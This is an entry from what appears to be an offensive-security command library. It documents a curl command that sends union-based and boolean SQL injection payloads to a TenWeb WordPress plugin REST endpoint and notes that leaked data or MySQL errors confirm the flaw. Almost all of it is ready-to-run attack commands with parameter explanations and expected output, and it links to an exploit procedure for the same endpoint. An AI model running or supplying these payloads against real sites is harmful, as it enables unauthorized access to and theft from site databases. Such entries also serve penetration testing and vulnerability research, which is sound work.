---
id: command-uuid-1
name: curl-sqli-payload
type: command
executor: bash
data: >-
  curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'url=1\'
  UNION SELECT 1,2,3--' -H 'Content-Type: application/x-www-form-urlencoded'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.533Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - sqli
  - web-exploit
verified: false
validated: true
submitted: true
---

# curl-sqli-payload

## Command

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'url=1\' UNION SELECT 1,2,3--' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command sends a POST request to the vulnerable TenWeb endpoint with a SQL injection payload to test for union-based injection, useful for confirming SQLi in WordPress plugins.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d 'url=...'` | Payload data for injection | Yes |
| `-H 'Content-Type: ...'` | Sets request header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'url=1\' UNION SELECT 1,2,3--' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\' AND 1=1--' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

## Expected Output

HTTP response with JSON or error indicating SQL execution, such as "MySQL syntax error" or leaked data in body.

## Related

- [[Related Procedure: Exploit-Unauthenticated-SQL-Injection-in-TenWeb-Endpoint]]
